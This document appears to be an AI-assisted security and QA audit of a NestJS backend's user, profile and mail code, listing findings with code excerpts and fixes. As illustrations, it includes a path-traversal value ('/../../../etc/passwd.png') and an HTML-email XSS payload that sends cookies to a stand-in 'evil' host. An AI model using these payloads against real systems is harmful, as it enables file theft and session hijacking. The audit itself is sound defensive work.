# QA — Users, Profile, Mail (NestJS backend)

Files opened:
- `web/back-nest/src/users/dto/create-user.dto.ts` (46 lines)
- `web/back-nest/src/users/dto/update-user.dto.ts` (32 lines)
- `web/back-nest/src/users/users.service.ts` (256 lines)
- `web/back-nest/src/users/users.controller.ts` (130 lines)
- `web/back-nest/src/users/users.module.ts` (12 lines)
- `web/back-nest/src/profile/profile.module.ts` (9 lines)
- `web/back-nest/src/profile/profile.service.ts` (112 lines)
- `web/back-nest/src/profile/profile.controller.ts` (59 lines)
- `web/back-nest/src/mail/mail.module.ts` (9 lines)
- `web/back-nest/src/mail/mail.service.ts` (50 lines)
- `web/back-nest/src/mail/mail.templates.ts` (185 lines)

Supporting files consulted (read-only, context only):
- `web/back-nest/src/main.ts` (42 lines) — global `ValidationPipe({ whitelist: true, transform: true })`
- `web/back-nest/src/auth/jwt.strategy.ts` (57 lines) — `request.user` shape is `{ userId, email, role, firstName, lastName, tokenVersion }`
- `web/back-nest/src/common/decorators/current-user.decorator.ts` (8 lines) — returns `request.user` as-is
- `web/back-nest/prisma/schema.prisma` lines 20–41 — `AppUser` model incl. `tokenVersion`, `mustChangePassword`, `avatarPath`, `preferences`

---

### [CRITICAL] `UsersController.deactivate` reads wrong field — self-deactivation guard is bypassed
- File: `web/back-nest/src/users/users.controller.ts:106-118`
- Category: auth|logic|security
- Evidence:
```ts
  @Post(':id/deactivate')
  async deactivate(
    @Param('id') id: string,
    @CurrentUser() user: { id: string },
  ) {
    const result = await this.usersService.deactivate(id, user.id);
```
- `AuthedUser` / `request.user` shape (from `jwt.strategy.ts:18-25, 48-55`) exposes `userId`, not `id`. So `user.id` is `undefined`.
- In `users.service.ts:224`:
```ts
    if (id === requestingUserId) {
      return Result.fail('Vous ne pouvez pas désactiver votre propre compte.');
    }
```
- Impact: The "cannot deactivate yourself" check always evaluates `id === undefined` → false. An Admin can deactivate their own account, which can lock the last admin out of the system. Secondary: downstream audit/log data keyed on the requester id is also missing.
- Fix: Destructure `{ userId }`: `@CurrentUser() user: { userId: string }` and pass `user.userId`. Also guard against "last remaining active admin" at the service layer.

### [CRITICAL] Account deactivation does NOT bump `tokenVersion` — deactivated users keep working JWTs
- File: `web/back-nest/src/users/users.service.ts:220-240`
- Category: auth|security
- Evidence:
```ts
  async deactivate(
    id: string,
    requestingUserId: string,
  ): Promise<Result> {
    ...
    await this.prisma.appUser.update({
      where: { id },
      data: { isActive: false },
    });

    return Result.ok();
  }
```
- `jwt.strategy.ts:40-47` only revokes tokens when `tokenVersion` mismatches; it does NOT check `isActive`. `roles.service.ts:222,230` does increment `tokenVersion` on role changes, proving the pattern exists, but `deactivate` omits it.
- Impact: A deactivated user's existing access tokens (default 7 days per `JWT_EXPIRES_IN`) remain valid for all authed endpoints until expiry. Defeats the purpose of deactivation for compromised accounts.
- Fix: In `deactivate`, update with `{ isActive: false, tokenVersion: { increment: 1 } }`. Add a matching check in `JwtStrategy.validate` that rejects `isActive === false` (belt-and-braces).

### [CRITICAL] Password reset also does not bump `tokenVersion`
- File: `web/back-nest/src/users/users.service.ts:191-218`
- Category: auth|security
- Evidence:
```ts
    await this.prisma.appUser.update({
      where: { id },
      data: { passwordHash, mustChangePassword: true },
    });
```
- Impact: After an admin resets a user's password (e.g., because credentials were leaked), the attacker's existing JWTs stay valid until natural expiry (7 days). Password rotation does not invalidate active sessions.
- Fix: Include `tokenVersion: { increment: 1 }` in the update. Do the same in `ProfileService.changePassword` (`profile.service.ts:68-72`).

### [CRITICAL] Self-service `ProfileService.changePassword` does not invalidate other sessions
- File: `web/back-nest/src/profile/profile.service.ts:68-72`
- Category: auth|security
- Evidence:
```ts
    const hash = await bcrypt.hash(newPassword, 10);
    await this.prisma.appUser.update({
      where: { id: userId },
      data: { passwordHash: hash, mustChangePassword: false },
    });
```
- Impact: Same as above — changing your password does not bump `tokenVersion`, so other signed-in devices / stolen JWTs remain authenticated.
- Fix: `data: { passwordHash: hash, mustChangePassword: false, tokenVersion: { increment: 1 } }` — and reissue a fresh JWT to the caller so they are not logged out.

### [CRITICAL] Path-traversal in avatar serving + upload
- File: `web/back-nest/src/profile/profile.service.ts:77-97` and controller `web/back-nest/src/profile/profile.controller.ts:33-45`
- Category: security|injection
- Evidence:
```ts
  async uploadAvatar(userId: string, base64Image: string, fileExtension: string) {
    const buffer = Buffer.from(base64Image, 'base64');
    if (buffer.length > 2 * 1024 * 1024) return Result.fail<string>('Image trop volumineuse (max 2 Mo).');

    if (!fs.existsSync(AVATAR_DIR)) fs.mkdirSync(AVATAR_DIR, { recursive: true });
    const fileName = `${userId}${fileExtension}`;
    const filePath = path.join(AVATAR_DIR, fileName);
    fs.writeFileSync(filePath, buffer);
```
```ts
  @Post('avatar')
  async uploadAvatar(@CurrentUser() user: { userId: string }, @Body() body: { base64Image: string; fileExtension: string }) {
```
- `fileExtension` is an untrusted string concatenated into a filesystem path. A caller can send `fileExtension: "/../../../etc/passwd.png"` or `"/../../prisma/schema.prisma"` — `path.join` resolves `..` segments, so the write lands outside `AVATAR_DIR`. No allow-list (`.png | .jpg | .jpeg | .webp`) is enforced, nothing validates the leading dot.
- `serveAvatar` (`profile.controller.ts:40-45`) compounds the issue:
```ts
  @Get('avatar/:userId')
  async serveAvatar(@Param('userId') userId: string, @Res() res: Response) {
    const result = await this.service.getAvatarPath(userId);
    if (result.isFailure) throw new NotFoundException(result.error);
    return res.sendFile(result.value as string, { root: '.' });
  }
```
  `getAvatarPath` returns `user.avatarPath` (which starts with `/`) and `res.sendFile` is then called with `root: '.'` — if an attacker successfully poisoned `avatarPath` via the upload endpoint (below) or DB direct, they can exfiltrate any readable file relative to the process cwd. Also, `avatarPath` is under `DEFAULT` whitelist but never re-validated before serving.
- Impact: Arbitrary file write (RCE if the path resolves into a require()-able location) and arbitrary file read via the `/avatar/:userId` endpoint.
- Fix:
  1. Reject any `fileExtension` that contains characters outside `/^\.(png|jpe?g|webp)$/i`.
  2. Detect MIME from the magic bytes of `buffer` (e.g. `file-type`), don't trust client.
  3. Store only a safe normalized filename (`${userId}.${ext}`), never interpolate raw input.
  4. Resolve `path.resolve(AVATAR_DIR, fileName)` and assert it `startsWith(AVATAR_DIR + path.sep)` before writing.
  5. In `serveAvatar`, resolve to absolute path under `AVATAR_DIR` and reject anything that escapes it.

### [HIGH] Mass-assignment: `ProfileController.updateProfile` accepts an untyped `Record<string, unknown>` body
- File: `web/back-nest/src/profile/profile.controller.ts:19-24` and service `profile.service.ts:32-45`
- Category: validation|security
- Evidence:
```ts
  @Put()
  async updateProfile(@CurrentUser() user: { userId: string }, @Body() dto: Record<string, unknown>) {
    const result = await this.service.updateProfile(user.userId, dto);
```
```ts
  async updateProfile(userId: string, dto: any) {
    ...
    const updated = await this.prisma.appUser.update({
      where: { id: userId },
      data: {
        ...(dto.firstName !== undefined && { firstName: dto.firstName }),
        ...(dto.lastName !== undefined && { lastName: dto.lastName }),
        ...(dto.jobTitle !== undefined && { jobTitle: dto.jobTitle }),
        ...(dto.phoneNumber !== undefined && { phoneNumber: dto.phoneNumber }),
        ...(dto.department !== undefined && { department: dto.department }),
      },
    });
```
- Because `dto` is `Record<string, unknown>` / `any`, `ValidationPipe({ whitelist: true })` has no DTO class to whitelist against and does NOT strip properties. The service's spread-based whitelist saves it today, but:
  1. There is no validation of string length (`firstName` / `lastName` are `@db.VarChar(100)` — a 10MB string will raise a DB error, no guardrail). Same for `phoneNumber`, `jobTitle`, `department`.
  2. Future maintainers are one keystroke away from adding `...dto` or accidentally spreading `role`/`passwordHash`/`isActive`/`email`/`tokenVersion`.
  3. Per the project's own CLAUDE.md constraint: "DTOs must be classes, not interfaces, when used with `@Body()` … NestJS's `ValidationPipe` with `whitelist: true` will strip all fields because the metatype resolves to `Object`." This controller violates it.
- Impact: Today: silent over-long writes / DB errors; latent: trivial privilege-escalation window on any future refactor.
- Fix: Create `UpdateProfileDto` (class) with `@IsOptional() @IsString() @MaxLength(100)` per field, import normally (not `import type`), use it in the controller.

### [HIGH] Mass-assignment: `ProfileController.updatePreferences` accepts `Record<string, unknown>` and JSON.stringifies it verbatim
- File: `web/back-nest/src/profile/profile.controller.ts:53-58`, `profile.service.ts:105-111`
- Category: validation|security
- Evidence:
```ts
  @Put('preferences')
  @HttpCode(HttpStatus.NO_CONTENT)
  async updatePreferences(@CurrentUser() user: { userId: string }, @Body() dto: Record<string, unknown>) {
```
```ts
  async updatePreferences(userId: string, prefs: any) {
    await this.prisma.appUser.update({
      where: { id: userId },
      data: { preferences: JSON.stringify(prefs) },
    });
```
- No validation, no size cap. `preferences` is `LongText` (up to ~4GB) — a client can bloat the column, and `getPreferences` calls `JSON.parse` on whatever was written. If `preferences` contains a `__proto__` key, downstream code that spreads the parsed object risks prototype-pollution on Node < 20.12 or non-defensive consumers.
- Impact: Storage abuse / log spam; latent prototype-pollution risk.
- Fix: Define `UpdatePreferencesDto` (class) with explicit `@IsBoolean()`, `@IsIn(['fr','en',...])`, `@MaxLength()` on string fields. Reject unknown keys with `whitelist: true` on a real class. Cap payload (`@IsObject()` + nested validation).

### [HIGH] Password-reset flow has no rate limiting — account enumeration + mail-bomb
- Files: `web/back-nest/src/users/users.controller.ts:95-104` and `src/mail/mail.service.ts:30-49`
- Category: security
- Evidence:
```ts
  @Post(':id/reset-password')
  async resetPassword(@Param('id') id: string) {
    const result = await this.usersService.resetPassword(id);
    ...
  }
```
- No `@nestjs/throttler` anywhere in `src/` (grep `Throttl|rate.?limit|@nestjs/throttler` — "No matches found"). Admin-only guard limits exposure somewhat, but:
  - Admin endpoints are still network-reachable; a compromised admin account can mail-bomb a user with unlimited reset emails (each containing a new valid temp-password, invalidating older ones).
  - Differential response codes (`404 Utilisateur non trouvé.` vs `200 ok`) enable account enumeration through any stolen admin token.
- Impact: Mail abuse / temp-password churn / enumeration.
- Fix: Add `@nestjs/throttler` globally (e.g., 5/min per user for `reset-password`, 20/min per IP for auth). Same-response-shape for existent vs non-existent users.

### [HIGH] `generateTempPassword` introduces modulo bias
- File: `web/back-nest/src/users/users.service.ts:59-64`
- Category: security
- Evidence:
```ts
function generateTempPassword(): string {
  const bytes = crypto.randomBytes(TEMP_PASSWORD_LENGTH);
  return Array.from(bytes)
    .map((b) => TEMP_PASSWORD_CHARS[b % TEMP_PASSWORD_CHARS.length])
    .join('');
}
```
- `TEMP_PASSWORD_CHARS` is 69 characters long. `256 % 69 = 49`, so byte values 0–186 map uniformly (≈2.7/char) and values 187–255 overlap chars 0–48 — chars 0–48 are ~1.5× more likely than chars 49–68. Entropy drops from the naive `log2(69^12) ≈ 73.2 bits` to ~72.5 bits. Acceptable in practice, but it is a "don't do this in crypto code" smell.
- Length 12 and `mustChangePassword: true` mitigate real-world impact, but the password is transmitted via email (plaintext at rest in SMTP logs and inbox) and logged to console when `EMAIL_ENABLED != true` (`mail.service.ts:31-33`).
- Impact: Slight entropy reduction; bigger concern is logging of the temp password when email is disabled.
- Fix: Use rejection sampling (re-draw bytes ≥ `floor(256/69)*69 = 253`), or use `crypto.randomInt(0, 69)` per char. Do not log `tempPassword` nor return it from the HTTP response when emailing is mandatory (today `users.service.ts:217` returns `{ tempPassword }` to the admin client; acceptable for bootstrap but should be a config flag).

### [HIGH] `ProfileService.changePassword` bypasses current-password check when `mustChangePassword === true`
- File: `web/back-nest/src/profile/profile.service.ts:55-75`
- Category: auth|logic
- Evidence:
```ts
    if (!user.mustChangePassword) {
      const valid = await bcrypt.compare(currentPassword, user.passwordHash);
      if (!valid) return Result.fail('Mot de passe actuel incorrect.');
    }
```
- Intent is to let a newly-reset user set a password without re-typing the temp. But any attacker who steals a session (e.g., XSS-leaked JWT) of a user in the `mustChangePassword` state can set an arbitrary new password without knowing the current one, taking over the account and keeping future access.
- Additionally, `ProfileController.changePassword` (`profile.controller.ts:26-31`) uses an untyped `{ currentPassword; newPassword }` body — no DTO class, so `ValidationPipe` doesn't run.
- Impact: Account takeover window for any reset-in-progress user, absent any current-password proof.
- Fix: Either (a) require the temp password in this call too (recommended), or (b) ensure the "must change" state is entered only on the first login flow that itself authenticated with the temp password, then rotate `tokenVersion` so only that session can complete the change. Add a proper `ChangePasswordDto` with validation and min-length 8 + regex rules that mirror `CreateUserDto`.

### [HIGH] HTML injection in email templates (stored XSS in mail client)
- File: `web/back-nest/src/mail/mail.templates.ts:67-166`
- Category: injection
- Evidence:
```ts
export function projectAssignedEmail(projectName: string, managerName: string): string {
  const body = `
    ${heading('Vous avez été assigné(e) à un projet')}
    ${paragraph(`Bonjour <strong>${managerName}</strong>,`)}
    ${paragraph(`Vous avez été désigné(e) comme chef de projet pour :`)}
    <div style="background-color:#f0fdfa;border-left:4px solid ${BRAND_COLOR};padding:16px;margin:16px 0;border-radius:0 ${BORDER_RADIUS} ${BORDER_RADIUS} 0;">
      <p style="margin:0;font-size:16px;font-weight:600;color:#0f766e;">${projectName}</p>
    </div>
```
```ts
export function commentMentionEmail(
  projectName: string,
  commenterName: string,
  commentPreview: string,
): string {
  const preview =
    commentPreview.length > 200 ? `${commentPreview.slice(0, 200)}…` : commentPreview;
  ...
      "${preview}"
```
```ts
export function passwordResetEmail(tempPassword: string): string {
  ...
      <code ...>${tempPassword}</code>
```
- Every template interpolates untrusted inputs (`projectName`, `managerName`, `commenterName`, `commentPreview`, `oldStatus`, `newStatus`, `phase`, `approvedBy`, `endDate`, and even `tempPassword`) directly into HTML with no escaping. A project named `</p><script>fetch('//evil/?c='+document.cookie)</script>` or a comment mention containing `<img src=x onerror=...>` is rendered verbatim. Most modern webmail (Gmail, Outlook) sanitizes, but desktop clients, embedded webviews, and signature-scrapers may not.
- `passwordResetEmail` is especially dangerous: the temp password is under the server's control today, but if `generateTempPassword` were ever changed to accept user input, this would leak directly into HTML.
- Impact: HTML/link injection in recipient mail clients; spoofing of content; potential XSS in less-hardened clients; phishing vector ("click here" overlays).
- Fix: Escape all interpolated values — either via a helper `escapeHtml(s)` at each `${}` boundary or by building with a templating engine that auto-escapes (handlebars, eta, mjml-with-safe-strings). Whitelist any HTML that is intentionally dynamic (e.g., `<strong>`).

### [HIGH] `UpdateUserDto` does not permit modifying `role` restrictions and is missing `isActive` — inconsistent with `users.service.ts.update`
- File: `web/back-nest/src/users/dto/update-user.dto.ts:11-32` vs `users.service.ts:177-186`
- Category: validation|logic
- Evidence:
```ts
export class UpdateUserDto {
  @IsOptional() @IsString() @MaxLength(100) readonly firstName?: string;
  @IsOptional() @IsString() @MaxLength(100) readonly lastName?: string;
  @IsOptional() @IsEmail(...) readonly email?: string;
  @IsOptional() @IsEnum(UserRoleValues) readonly role?: string;
}
```
```ts
    const data: Record<string, unknown> = {};
    if (dto.firstName !== undefined) data.firstName = dto.firstName;
    if (dto.lastName !== undefined) data.lastName = dto.lastName;
    if (dto.email !== undefined) data.email = dto.email;
    if (dto.role !== undefined) data.role = dto.role;
```
- No `isActive`, `passwordHash`, `mustChangePassword`, `tokenVersion`, `failedLoginAttempts`, `lockedUntil` on the DTO, and the service's manual whitelist matches. Good today — but this relies entirely on code discipline in the service.
- Separately: the DTO allows `role` changes through the generic `PUT :id`, but `users.service.ts:183-186` does NOT bump `tokenVersion` on role change. Compare `roles.service.ts:220-230` which does bump it. That means an Admin using `PUT /admin/appuser/:id` with a `role` change produces a stale-role JWT until expiry.
- Impact: Privilege downgrade / upgrade doesn't take effect until the user's JWT expires; permissions cache also won't refresh (see `permissions.service.ts:108`).
- Fix: In `users.service.update`, if `dto.role !== undefined && dto.role !== user.role`, include `tokenVersion: { increment: 1 }` and also invalidate `PermissionsService` cache. Consider routing role changes exclusively through `RolesService` to avoid two code paths.

### [HIGH] `CreateUserDto.role` accepts a legacy role set that does not match the `Permission` system
- File: `web/back-nest/src/users/dto/create-user.dto.ts:11` and `update-user.dto.ts:9`
- Category: validation|logic
- Evidence:
```ts
const UserRoleValues = ['Admin', 'ProjectManager', 'SpecificationTeam', 'RealizationTeam', 'DeploymentTeam', 'Viewer'] as const;
```
- Hard-coded list duplicated in two DTOs. If the `Role` model in the DB has additional/custom roles (the presence of `src/roles/` and `src/permissions/` suggests RBAC beyond this static list), creating a user with any non-enumerated role is impossible, and a schema drift here silently rejects valid data.
- [UNCERTAIN] — I did not open `src/roles/roles.service.ts` and `src/permissions/permissions.service.ts` in full, so the exact authoritative role list is unverified.
- Impact: Inability to assign newly-added roles via the users API; dual-source-of-truth bug.
- Fix: Load role names from `RolesService` or a shared `ROLES` constant; use a custom `@IsValidRole()` class-validator decorator that resolves at request time.

### [HIGH] Avatar path written to DB uses `/uploads/...` but served with `root: '.'` — misalignment on Windows and regression risk
- File: `web/back-nest/src/profile/profile.service.ts:86-96` and `profile.controller.ts:41-45`
- Category: logic|security
- Evidence:
```ts
    const avatarPath = `/uploads/avatars/${fileName}`;
    await this.prisma.appUser.update({ where: { id: userId }, data: { avatarPath } });
```
```ts
  @Get('avatar/:userId')
  async serveAvatar(@Param('userId') userId: string, @Res() res: Response) {
    const result = await this.service.getAvatarPath(userId);
    if (result.isFailure) throw new NotFoundException(result.error);
    return res.sendFile(result.value as string, { root: '.' });
  }
```
- `res.sendFile` with a leading-slash path + `root: '.'` — on Express, an absolute path combined with `root` throws (`path must be a relative`). On Windows, `/uploads/...` is interpreted as drive-root-relative (e.g., `C:\uploads\avatars\...`), which is NOT what `AVATAR_DIR = path.join(process.cwd(), 'uploads', 'avatars')` wrote. [UNCERTAIN] — actual runtime behavior depends on Express version and normalization; at minimum this is inconsistent.
- Also, `getAvatarPath` validates file existence on `path.join(process.cwd(), user.avatarPath)` (line 94) but `serveAvatar` then resolves the same string against `root: '.'` — a different base-path. One check doesn't guarantee the other succeeds.
- Impact: Broken avatar delivery or wrong file served / 404 on Windows; inconsistent validation.
- Fix: Store only the bare filename in `avatarPath` (e.g., `${userId}.png`). In `serveAvatar`, build an absolute path via `path.join(AVATAR_DIR, fileName)`, then `res.sendFile(absolute)` with no `root`. Verify `path.resolve(absolute).startsWith(path.resolve(AVATAR_DIR) + path.sep)` before sending.

### [HIGH] `ProfileController.serveAvatar` has no authorization — any authenticated user can fetch any other user's avatar
- File: `web/back-nest/src/profile/profile.controller.ts:40-45`
- Category: auth
- Evidence:
```ts
  @Get('avatar/:userId')
  async serveAvatar(@Param('userId') userId: string, @Res() res: Response) {
    const result = await this.service.getAvatarPath(userId);
    ...
  }
```
- Any logged-in user can request any other user's avatar by changing `:userId`. Avatars are arguably public-ish, but the combined path-traversal issue above means this endpoint is the widest-open read surface.
- Impact: Low on its own (profile photos); compounded with path-traversal, it becomes a cross-resource read primitive.
- Fix: Fix the traversal first (mandatory). Consider whether avatars require auth at all; if yes, restrict to same user or organizational peers.

### [MEDIUM] Email uniqueness check uses `findFirst` with raw `equals`, not `findUnique` — race + case-sensitivity
- File: `web/back-nest/src/users/users.service.ts:131-137` (create) and `164-175` (update)
- Category: logic|validation
- Evidence:
```ts
    const existingUser = await this.prisma.appUser.findFirst({
      where: { email: { equals: dto.email } },
    });
```
- `schema.prisma:24` declares `email String @unique`. `findUnique` would be faster. More importantly, the check+insert is not transactional — a concurrent create can slip through and the DB unique constraint is the real guard, which would throw a raw Prisma error (`P2002`) that the Result pattern doesn't translate.
- Also, MySQL `@unique` on a VARCHAR collation is case-insensitive by default (`utf8mb4_unicode_ci`) — so `findFirst({ email: { equals: dto.email } })` may return a user whose email differs only in case. The code then uses `dto.email.toLowerCase()` to compare in the `update` path (line 164) but does NOT normalize on insert (line 146 stores `dto.email` as-is, preserving user-supplied casing).
- Impact: Potential `P2002` crash on race; casing inconsistencies in stored data.
- Fix: Normalize emails (`dto.email.trim().toLowerCase()`) at DTO transform or in the service. Catch `P2002` from `.create()` / `.update()` and translate to `Result.fail('...exists.')`.

### [MEDIUM] `users.service.getAll` builds `where` with typed-as-`Record<string, unknown>` escape hatch
- File: `web/back-nest/src/users/users.service.ts:79-101`
- Category: validation
- Evidence:
```ts
    const where: Record<string, unknown> = {};

    if (search) {
      where.OR = [
        { firstName: { contains: search } },
        { lastName: { contains: search } },
        { email: { contains: search } },
      ];
    }
```
- `search` comes straight from the query string with no length cap (`users.controller.ts:33`). A caller can send `?search=<500KB>` and cause MySQL to do an expensive full-table scan with `LIKE '%…%'`. No `@MaxLength` and no Prisma `mode: 'insensitive'` (MySQL collation makes that moot, but it's not explicit).
- Impact: DoS via search regex / slow query.
- Fix: Validate `search` (`@IsString() @MaxLength(100)`) in a dedicated `QueryUsersDto`. Require a minimum length (e.g., 2) or reject if absurdly long.

### [MEDIUM] Missing pagination caps in controller query parsing
- File: `web/back-nest/src/users/users.controller.ts:29-48`
- Category: validation
- Evidence:
```ts
    const result = await this.usersService.getAll(
      Number(skip) || 0,
      Number(take) || 20,
      search,
      role,
    );
```
- `take` is not capped. `?take=1000000` will try to return one million users. `Number(skip) || 0` swallows `NaN` / negatives silently (`Number('-5') === -5`, falsy? — `-5 || 0 === -5`, so negative skips pass through and Prisma rejects them with a non-friendly error).
- Impact: DoS / unfriendly 500 errors.
- Fix: Introduce `GetUsersQueryDto` (class) with `@Type(() => Number)`, `@Min(0)`, `@Max(200)` on `take`, `@Min(0)` on `skip`.

### [MEDIUM] `getByRole` returns all users of a role with no pagination
- File: `web/back-nest/src/users/users.service.ts:121-128`, controller at `61-70`
- Category: logic|security
- Evidence:
```ts
  async getByRole(role: string): Promise<Result<UserResponseDto[]>> {
    const users = await this.prisma.appUser.findMany({
      where: { role, isActive: true },
      orderBy: { lastName: 'asc' },
    });
```
- Returns every active user of a given role unbounded. `role` is untyped — should be `@IsEnum(UserRoleValues)` via a DTO; currently any string passes.
- Impact: Data volume unbounded; mild enumeration surface (lists all Admins, etc.).
- Fix: Validate `role` against the enum, paginate, keep Admin-only guard (already in place at `users.controller.ts:25`).

### [MEDIUM] SMTP errors are swallowed — `MailService.send` catches and logs but does not re-throw
- File: `web/back-nest/src/mail/mail.service.ts:30-49`
- Category: logic
- Evidence:
```ts
    try {
      await this.transporter.sendMail({ ... });
      this.logger.debug(`Email sent to ${to}: ${subject}`);
    } catch (err: unknown) {
      this.logger.error(`Failed to send email to ${to}: ...`);
    }
  }
```
- Combined with `users.service.ts:209-215` (`.catch(() => undefined)` on the Promise), a failed SMTP delivery on password reset is invisible to the admin UI. The admin sees "reset OK, temp password returned" while the user never receives the email, leading to help-desk churn.
- Impact: Silent mail failures; admin cannot detect misconfiguration; users locked out.
- Fix: Return a status from `MailService.send` (`Result<void>` or boolean) so callers can surface "email failed — please copy the temp password" warnings. Keep the ".catch" in user-facing flows, but log at `error` with the full stack and expose a health-check endpoint. Re-throw or emit a metric on transport construction errors.

### [MEDIUM] `SMTP` transport uses `secure: false` unconditionally — STARTTLS not enforced
- File: `web/back-nest/src/mail/mail.service.ts:14-22`
- Category: security
- Evidence:
```ts
      this.transporter = nodemailer.createTransport({
        host: config.get<string>('SMTP_HOST'),
        port: Number(config.get<string>('SMTP_PORT') ?? '587'),
        secure: false,
        auth: {
          user: config.get<string>('SMTP_USER'),
          pass: config.get<string>('SMTP_PASS'),
        },
      });
```
- `secure: false` means connect plaintext and upgrade via STARTTLS. Nodemailer upgrades if the server offers it, but there's no `requireTLS: true`. With a misconfigured server, credentials and temp passwords are shipped in cleartext.
- Impact: Credential leakage on network paths where TLS upgrade isn't enforced.
- Fix: Derive `secure` from port (`secure: port === 465`), and set `requireTLS: true` unless explicitly disabled by env.

### [MEDIUM] `EMAIL_ENABLED` disabled path logs email subject + recipient but not body — however `resetPassword` still returns `tempPassword` in HTTP
- File: `web/back-nest/src/mail/mail.service.ts:31-33` and `users.service.ts:209-217`
- Category: security|logic
- Evidence:
```ts
    if (!this.transporter) {
      this.logger.log(`[EMAIL DISABLED] To: ${to} | Subject: ${subject}`);
      return;
    }
```
```ts
    void this.mail
      .send(user.email, 'Réinitialisation de votre mot de passe NeoLeadge', passwordResetEmail(tempPassword))
      .catch(() => undefined);

    return Result.ok({ tempPassword });
```
- The HTTP response echoes `tempPassword` to the admin — by design for the "email disabled" dev flow, but in production this means the admin's HTTP access logs (reverse proxy, APM, browser history) contain a plaintext usable credential. Paired with a web framework that auto-saves the response body to telemetry (`nestjs-pino` is configured, see `main.ts:7,12`), this can persist.
- Impact: Plaintext temp password in logs/telemetry/browser history/mirroring HTTP caches.
- Fix: Return `tempPassword` only when `EMAIL_ENABLED !== 'true'` (dev fallback). In production, return just `{ sent: true }` and rely on the email path. Filter `tempPassword` from any logger interceptor.

### [MEDIUM] No check that `newPassword !== currentPassword` in `ProfileService.changePassword`
- File: `web/back-nest/src/profile/profile.service.ts:55-75`
- Category: security|logic
- Evidence: nothing prevents setting `newPassword === currentPassword`.
- Impact: Users complying with "you must change your password" can just re-submit the temp password (or their old one), clearing the `mustChangePassword` flag without actually changing anything.
- Fix: After validating strength, `await bcrypt.compare(newPassword, user.passwordHash)` and reject if equal. Optionally track password history and block re-use of last N.

### [MEDIUM] `preferences` parsed without try/catch — malformed JSON crashes the endpoint
- File: `web/back-nest/src/profile/profile.service.ts:99-103`
- Category: logic
- Evidence:
```ts
  async getPreferences(userId: string) {
    const user = await this.prisma.appUser.findUnique({ where: { id: userId }, select: { preferences: true } });
    if (!user) return Result.fail<any>('Utilisateur non trouvé.');
    return Result.ok(user.preferences ? JSON.parse(user.preferences) : { ...DEFAULT_PREFERENCES });
  }
```
- If the column is ever hand-edited or corrupted, `JSON.parse` throws synchronously, surfacing a 500.
- Impact: Low (requires bad data in DB) but brittle.
- Fix: Wrap in try/catch; on parse error, return `DEFAULT_PREFERENCES` and log a warning.

### [LOW] `CreateUserDto.password` validation mismatches `ProfileService.changePassword` policy
- File: `create-user.dto.ts:31-42` vs `profile.service.ts:64`
- Category: validation|logic
- Evidence:
  - DTO: `@MinLength(8) @Matches(/[A-Z]/) @Matches(/[0-9]/)`
  - Service: `newPassword.length < 8 || !/[A-Z]/.test(newPassword) || !/[0-9]/.test(newPassword)`
- Same rule duplicated in two places, each free to drift. Neither requires lowercase or a special character; both are weaker than the `TEMP_PASSWORD_CHARS` alphabet implies.
- Impact: Policy drift risk; relatively weak minimum.
- Fix: Centralize password policy in a single `validatePassword(pw: string)` util used by the DTO (`@Validate(IsStrongPassword)`) and the service.

### [LOW] `UsersController` uses `/admin/appuser` prefix — spec document says `/admin/users`
- File: `web/back-nest/src/users/users.controller.ts:23`
- Category: logic
- Evidence:
```ts
@Controller('admin/appuser')
```
- Project `CLAUDE.md` routes table says `GET /admin/users`, `POST /admin/users`, etc. This controller exposes `/admin/appuser/*`, including `/admin/appuser/:id/reset-password`. Minor, but confusing.
- Impact: Doc drift, potentially stale frontend URLs.
- Fix: Rename to `@Controller('admin/users')` or update the docs.

### [LOW] `UsersService.resetPassword` has no "lock admin out of self" guard — an admin CAN reset their own password via this route
- File: `web/back-nest/src/users/users.service.ts:191-218` / controller `95-104`
- Category: logic
- Evidence: No `requestingUserId !== id` check (unlike `deactivate`).
- Impact: Minor — admin resets own password, logs themselves in with temp creds. Audit artifact ("Admin reset admin") is fine but should be intentional.
- Fix: Either allow explicitly and add `tokenVersion: { increment: 1 }` (already recommended above) so their current session is killed, or block and provide a dedicated "change my own password" flow.

### [LOW] `ProfileController.getPreferences` does not wrap in `if (isFailure)` check
- File: `web/back-nest/src/profile/profile.controller.ts:48-51`
- Category: logic
- Evidence:
```ts
  @Get('preferences')
  async getPreferences(@CurrentUser() user: { userId: string }) {
    const result = await this.service.getPreferences(user.userId);
    return result.value;
  }
```
- If `getPreferences` returns a failure `Result`, `result.value` is (per the Result pattern) `undefined`/`null`, which the client receives silently instead of a proper 4xx.
- Impact: Inconsistent error shape vs other endpoints.
- Fix: `if (result.isFailure) throw new NotFoundException(result.error);`

### [LOW] `MailService` is declared `@Global()` but `UsersModule` still imports `MailModule`
- File: `web/back-nest/src/mail/mail.module.ts:4-9` and `users.module.ts:4-7`
- Category: logic
- Evidence:
```ts
@Global()
@Module({ providers: [MailService], exports: [MailService] })
export class MailModule {}
```
```ts
@Module({
  imports: [MailModule],
```
- Because `MailModule` is `@Global()`, the explicit import in `UsersModule` is redundant. Harmless, but misleading to readers (suggests non-global).
- Impact: None functionally; style/clarity.
- Fix: Drop the `MailModule` import from `UsersModule` OR drop `@Global()` from `MailModule` (pick one idiom and apply consistently across modules).

### [LOW] `CreateUserDto` marks fields `readonly` but not transformed — `email` not normalized before uniqueness check
- File: `create-user.dto.ts:29` and `users.service.ts:131-137`
- Category: validation
- Evidence: Emails are compared with `findFirst({ email: { equals: dto.email } })` but never lowercased/trimmed. A user registering as `Foo@Bar.com` and another registering as `foo@bar.com` can collide (since MySQL collation is usually CI) or slip past depending on collation.
- Impact: Data inconsistency; covered partially by the MEDIUM finding above.
- Fix: `@Transform(({ value }) => value?.trim().toLowerCase())` on all `email` DTO fields.

### [LOW] `ProfileController` uses `@Controller('api/userprofile')` singular — inconsistent with `/api/*` vs `/pm/*` vs `/admin/*` conventions elsewhere
- File: `profile.controller.ts:7`
- Category: logic
- Evidence:
```ts
@Controller('api/userprofile')
```
- Neighboring controllers use `/admin/*`, `/pm/*`, `/api/time-entries`. "userprofile" is singular + camel-compacted. Minor style drift.
- Fix: Standardize as `/api/profile` or `/api/user-profile`.

### [UNCERTAIN] Avatar upload does not record or verify the MIME type of the `base64Image` payload
- File: `web/back-nest/src/profile/profile.service.ts:77-88`
- Category: security|validation
- Evidence: The service trusts the extension; it does not inspect magic bytes of `buffer` to confirm it's an image. A 2MB executable can be uploaded with `fileExtension: ".png"` and served back via `/avatar/:userId` to the attacker's browser — browsers won't execute it, but it's still "arbitrary file stored under server-controlled route" primitive.
